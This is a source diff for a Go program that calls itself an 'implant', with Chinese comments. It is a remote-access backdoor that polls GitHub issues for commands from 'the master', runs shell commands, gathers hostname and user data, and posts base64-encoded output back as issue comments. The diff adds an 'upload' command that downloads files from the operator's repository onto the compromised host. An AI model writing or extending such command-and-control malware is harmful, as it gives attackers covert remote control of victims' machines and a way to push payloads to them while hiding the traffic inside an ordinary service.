@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"time"
@@ -21,6 +22,11 @@ type GitHubIssue struct {
 // Issue 用于解析 GitHub API 返回的 issue 列表中的单个 issue 数据
 type Issue struct {
 	Number int `json:"number"` // Issue 编号
+}
+
+type GitHubFileContent struct {
+	Content  string `json:"content"`
+	Encoding string `json:"encoding"`
 }
 
 // 获取当前仓库的最晚 issue 编号，倒序
@@ -151,10 +157,6 @@ func pwd() string {
 
 // 获取计算机名称和用户名称
 func getUID() string {
-	//hostname, err := os.Hostname()
-	//if err != nil {
-	//	return fmt.Sprintf("Failed to get hostname: %v", err)
-	//}
 	var cmd *exec.Cmd
 	switch runtime.GOOS {
 	case "windows":
@@ -196,6 +198,59 @@ func shell(command string) string {
 	return string(out)
 }
 
+// downloadFile 从GitHub仓库下载文件
+func downloadFile(token, user, repo, remoteFilePath string) error {
+	// 构建请求URL
+	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", user, repo, remoteFilePath)
+
+	// 创建请求
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return fmt.Errorf("create request error: %v", err)
+	}
+
+	// 设置请求头
+	req.Header.Set("Authorization", "token "+token)
+	req.Header.Set("Accept", "application/vnd.github.v3+json")
+
+	// 发送请求
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("request error: %v", err)
+	}
+	defer resp.Body.Close()
+
+	// 检查响应状态
+	if resp.StatusCode != http.StatusOK {
+		body, _ := ioutil.ReadAll(resp.Body)
+		return fmt.Errorf("download fail, status_code: %d，resp: %s", resp.StatusCode, body)
+	}
+
+	// 读取响应体
+	var fileContent struct {
+		Content string `json:"content"`
+	}
+	if err := json.NewDecoder(resp.Body).Decode(&fileContent); err != nil {
+		return fmt.Errorf("decode Resp error: %v", err)
+	}
+
+	// 将Base64内容解码
+	data, err := base64.StdEncoding.DecodeString(fileContent.Content)
+	if err != nil {
+		return fmt.Errorf("base64 decode content error: %v", err)
+	}
+
+	// 保存到当前目录
+	localFileName := filepath.Base(remoteFilePath)
+	if err := ioutil.WriteFile(localFileName, data, 0644); err != nil {
+		return fmt.Errorf("write file error: %v", err)
+	}
+
+	fmt.Printf("file download success: %s\n", localFileName)
+	return nil
+}
+
 func main() {
 	if len(os.Args) < 4 {
 		fmt.Println("Usage: implant <AccessToken> <Username> <Repository>")
@@ -223,7 +278,7 @@ func main() {
 
 		if title == "" {
 			fmt.Println("Waiting for the master to input command...")
-			time.Sleep(2 * time.Second)
+			time.Sleep(3 * time.Second)
 		}
 		if title != "" {
 			issueNbr++
@@ -239,7 +294,7 @@ func main() {
 			}
 		}
 
-		if title != "" && strings.HasPrefix(title, "getuid") {
+		if title != "" && strings.HasPrefix(title, "whoami") {
 			result := getUID()
 			encoded := base64Encode(result)
 			fmt.Printf("Encoded result: %s\n", encoded)
@@ -258,6 +313,28 @@ func main() {
 			}
 		}
 
+		if title != "" && strings.HasPrefix(title, "upload") {
+			// 等待一会，不然好像会404
+			time.Sleep(3 * time.Second)
+			args := strings.Fields(title)
+			remote_file_name := args[2]
+			if err := downloadFile(token, owner, repo, remote_file_name); err != nil {
+				fmt.Println("download github file Error:", remote_file_name, err)
+				result := "upload failed"
+				encoded := base64Encode(result)
+				if err := PostComment(token, owner, repo, issueNbrStr, encoded); err != nil {
+					fmt.Println(fmt.Errorf("Failed to post comment: %v", err))
+				}
+			} else {
+				//fmt.Println("download github file success")
+				result := "upload success"
+				encoded := base64Encode(result)
+				if err := PostComment(token, owner, repo, issueNbrStr, encoded); err != nil {
+					fmt.Println(fmt.Errorf("Failed to post comment: %v", err))
+				}
+			}
+		}
+
 		if title != "" && strings.HasPrefix(title, "exit") {
 			result := "Exited !!"
 			encoded := base64Encode(result)
@@ -267,7 +344,6 @@ func main() {
 			}
 			return
 		}
-		time.Sleep(5 * time.Second)
 
 	}
 }
